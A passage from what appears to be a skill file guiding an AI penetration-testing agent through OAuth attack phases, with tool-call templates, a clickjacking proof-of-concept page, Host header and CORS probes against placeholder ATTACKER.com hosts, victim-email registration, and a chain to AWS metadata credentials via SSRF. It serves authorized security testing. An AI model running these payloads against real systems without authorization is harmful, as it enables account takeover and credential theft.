# If 200 → OA14-D: Token expiration not enforced
```

---

### Phase 14 — OA15/OA16: Consent Screen Attacks & Host Header Injection

#### 14a — Consent Screen Clickjacking

```
# Test if the /authorize endpoint allows framing:
http(action="request", url="https://OAUTH_PROVIDER/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT&scope=openid&state=X")
# Check response headers:
# X-Frame-Options: DENY / SAMEORIGIN → protected
# Content-Security-Policy: frame-ancestors 'none' → protected
# Missing both → clickjacking possible
```

PoC HTML:
```html
<html>
<body>
<style>
  iframe { opacity: 0.0; width: 400px; height: 600px; position: absolute; top: 50px; left: 50px; z-index: 10; }
  button { position: absolute; top: 300px; left: 120px; z-index: 5; }
</style>
<iframe src="https://OAUTH_PROVIDER/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=ATTACKER_REDIRECT&scope=openid&state=X"></iframe>
<button>Click here to claim your prize!</button>
</body>
</html>
```

#### 14b — Host Header Injection on OAuth Redirect

```
# Test if the OAuth redirect URL is constructed from the Host header:
http(action="request",
  url="https://OAUTH_PROVIDER/authorize?response_type=code&client_id=CLIENT_ID&redirect_uri=REDIRECT&scope=openid",
  headers={"Host": "ATTACKER.com"}
)
# If the 302 Location contains "ATTACKER.com" in the redirect → Host header injection confirmed
```

---

### Phase 15 — OA19: Mix-Up Attack (Multiple IdP)

**Why it matters:** When a client supports multiple IdPs and doesn't verify `iss` binding between authorization request and token response, an attacker can redirect a flow intended for IdP-A to IdP-B — leaking the IdP-A client secret to IdP-B.

**Test 15a — Multiple IdP detection:**
Check if the target app offers multiple social login options (Google, GitHub, Microsoft, Facebook, LinkedIn). If yes → mix-up surface exists.

**Test 15b — iss validation check:**
1. Initiate login with IdP-A, intercept the callback
2. Substitute the authorization code with a code from IdP-B (attacker's account)
3. Check if the app sends this code to IdP-A's token endpoint (where it will fail) or validates `iss` first
4. Alternatively: check if the app validates that the `iss` in the ID token matches the IdP it intended

**Test 15c — sub value collision:**
If IdP-A and IdP-B can both issue `sub=12345` for different users, and the app only stores `sub` without `iss`:
```
# IdP-A issues id_token with sub="12345" for victim
# Create an account at IdP-B that also has sub="12345" (if controllable)
# Log in via IdP-B OAuth → if app matches on sub alone → account collision
```

---

### Phase 16 — OA17/OA18: Additional Attacks

#### 16a — Unverified Provider Registration

```
# Register at the OAuth provider using the victim's email address (no email verification):
http(action="request",
  url="https://OAUTH_PROVIDER/register",
  method="POST",
  body='{"email":"victim@example.com","password":"Attacker1234!"}'
)
# If no email verification is required → attacker account created with victim's email
# → log in to target app via OAuth → if app trusts provider's email → account takeover
```

#### 16b — CORS Misconfiguration on UserInfo Endpoint

```
# Test CORS on userinfo endpoint with an attacker origin:
http(action="request",
  url="https://OAUTH_PROVIDER/oauth/userinfo",
  method="GET",
  headers={
    "Authorization": "Bearer VICTIM_ACCESS_TOKEN",
    "Origin": "https://ATTACKER.com"
  }
)
# If response contains: Access-Control-Allow-Origin: https://ATTACKER.com
# AND the endpoint returns user claims → OA18: CORS misconfiguration on userinfo
```

---

### Phase 17 — Automated Sweep with KOAuth

For thorough depth, run KOAuth — the automated OAuth 2.0 security scanner:

```
kali(command="git clone https://github.com/morganc3/KOAuth /tmp/KOAuth && cd /tmp/KOAuth && go build .")

# Configure KOAuth with the target's OAuth parameters:
kali(command="cat > /tmp/koauth-config.json << 'EOF'
{
  \"AuthorizationURL\": \"https://OAUTH_PROVIDER/authorize\",
  \"TokenURL\": \"https://OAUTH_PROVIDER/oauth/token\",
  \"RedirectURI\": \"https://LEGITIMATE_REDIRECT/callback\",
  \"ClientID\": \"CLIENT_ID\",
  \"Scope\": \"openid email profile\"
}
EOF")

kali(command="cd /tmp/KOAuth && ./KOAuth -config /tmp/koauth-config.json -output /tmp/koauth-results.html")
```

KOAuth performs 22 automated checks covering:
- redirect_uri validation bypass attempts
- state parameter validation
- PKCE enforcement
- Scope handling
- Token leakage

Review `/tmp/koauth-results.html` and cross-reference with manual findings.

---

### Phase 18 — Verification & PoC

For every confirmed finding:

1. `report(action="note", data={"message": "Verifying: <finding name>"})`
2. Reproduce the exploit with `http(action="request", ..., poc=True)`
3. `http(action="save_poc", options={"title": "oauth-<category>-<short-description>"})`
4. `report(action="finding", data={...})`

**Severity guidance:**

| Severity | Condition |
|----------|-----------|
| **Critical** | Full account takeover demonstrated (code redirect + token exchange + victim account access) |
| **High** | Redirect URI bypass confirmed (code goes to attacker endpoint), mutable claims ATO, pre-ATO, device code phishing with token captured |
| **High** | PKCE absent on public client with code injection demonstrated |
| **Medium** | Scope escalation, missing state parameter CSRF (no demo'd ATO), refresh token not revoked on logout |
| **Medium** | SSRF via dynamic client registration (blind — no IAM cred) |
| **Low** | Implicit grant in use, clickjacking on consent screen (no actual exploit), WebFinger enumeration |
| **Info** | Token in URL fragment only, missing `email_verified` check without exploitation path |

---

### Phase 19 — Report & Wrap-Up

1. `report(action="diagram", data={...})` — draw the most impactful attack chain:

```mermaid
flowchart TD
  Recon["GET /.well-known/openid-configuration"] --> Endpoints["Enumerate: authorize, token, userinfo, register"]
  Endpoints --> RedirBypass["redirect_uri bypass: .evil.com suffix accepted"]
  RedirBypass --> CodeTheft["Victim clicks attacker URL → code sent to attacker.com"]
  CodeTheft --> TokenExchange["POST /token with stolen code → access_token obtained"]
  TokenExchange --> ATO["GET /api/user/profile → Victim data accessed — Account Takeover"]
  Endpoints --> DynReg["POST /register unauthenticated → logo_uri=169.254.169.254"]
  DynReg --> SSRF["Consent screen loads → SSRF → AWS IMDS credentials"]
```

2. `session(action="complete", options={"summary": "..."})`

3. **Chain to `/post-exploit`** if account takeover was demonstrated
4. **Chain to `/web-exploit`** if open redirect / XSS / SSRF primitives were found and need deeper exploitation
5. **Chain to `/credential-audit`** if access tokens, refresh tokens, or client secrets were recovered

---

## Context Recovery After Compaction

1. Re-invoke `/oauth-security` via `Skill(skill="oauth-security")`
2. `session(action="status")` — check coverage matrix
3. Resume from the last incomplete phase
4. Do NOT re-run Phase 1 discovery — endpoints persist

---

## Rules

- **`session(action="start", ...)` is mandatory** — never run any other tool before it
- **Discovery before testing** — run Phase 1 in full before any exploit attempts
- **Two accounts are required for mutable claims and client confusion tests** — ask the user if not provided
- **Always test state + redirect_uri + PKCE first** — these are the highest-yield, lowest-effort checks
- **Chain findings** — a redirect_uri bypass that delivers a code is interesting; chained with an open redirect on the whitelisted domain to exfiltrate that code to an attacker server is critical
- **Never fabricate findings** — only report what you actually verified with a request/response pair
- **`poc=True`** — only set this flag on confirmed, report-worthy exploits
- **Mermaid syntax rules**: use `flowchart TD`, quote labels, no em-dashes, short alphanumeric node IDs
- **Use `report(action="note", ...)` liberally** — call it before every tool to explain why, and after every significant result
- **The redirect_uri bypass matrix has 20 entries** — run ALL of them; servers implement validation in unexpected ways and a single working bypass is a critical finding
- **Always decode JWT tokens** with `jwt_tool --decode` before trying to forge them — understand the algorithm, key ID, and claims first
- **PKCE S256 is the only safe method** — `plain` is exploitable, absent is worse
- Call `session(action="stop_kali")` at the end if `kali(command=...)` was used
